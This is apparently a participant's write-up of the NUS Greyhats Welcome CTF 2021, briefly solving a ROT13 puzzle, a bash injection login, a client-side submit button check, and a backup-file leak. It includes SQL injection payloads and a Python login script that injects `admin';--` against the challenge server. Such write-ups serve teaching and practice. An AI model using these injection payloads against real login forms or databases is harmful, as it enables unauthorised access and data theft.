# NUS Greyhats Welcome CTF 2021

This file is for the other challenges that don't have their dedicated `.md` file.

## Pasta

Caesar cipher, that just so happens to also be ROT13.

## Bash Injection

Add a single double quote to get out of the login, then play around. You can find the flag by printing out `login.sh`

## No Submit Security

Using the Inspect Element window, just add the submit button back.

## Covid Tracker.

First use a username of `admin'--` to log on. 

Then, use a `UNION SELECT` clause to include the flag in the
result of the call to locations.

Probably something like 
```sql
' UNION SELECT value, value, COUNT(value) FROM flag; --
```
would work.

```python

import requests, json

s = requests.Session()

def try_login(user, pw):
    # print("!!! Call on user", user, "pw", pw)
    r = s.post("http://challs1.nusgreyhats.org:5201/api/login",
            data={"username":user, "password":pw})
    try:
        k = json.loads(r.content)
        if k["err"] != "Incorrect Login":
            print("!!! error other than incorrect login:", k["err"], "on login", user, pw)
    except:
        pass
    return r.status_code == 200

try_login("admin';--", "") # IMPORTANT, lets us access /api/locations

def query_locations(search):
    r = s.post("http://challs1.nusgreyhats.org:5201/api/locations",
            data={"search": search})
    if r.status_code != 200:
        print("!!! error:", r.content)
    else:
        return json.loads(r.content)

```

## No Ketchup, Just Sauce

First, divine that you are supposed to access `robots.txt` to find `reborn.php`.

Then, from the backup comment, divine that you are supposed to access `reborn.php.bak`, in which the flag is accessible in plaintext.

# Credits

I just want to thank my teammates tisrandomkid, sean, and Wei Jun, for helping with some of the other challenges, (in particular, we somehow solved KTANE with very little reverse engineering. Whew.)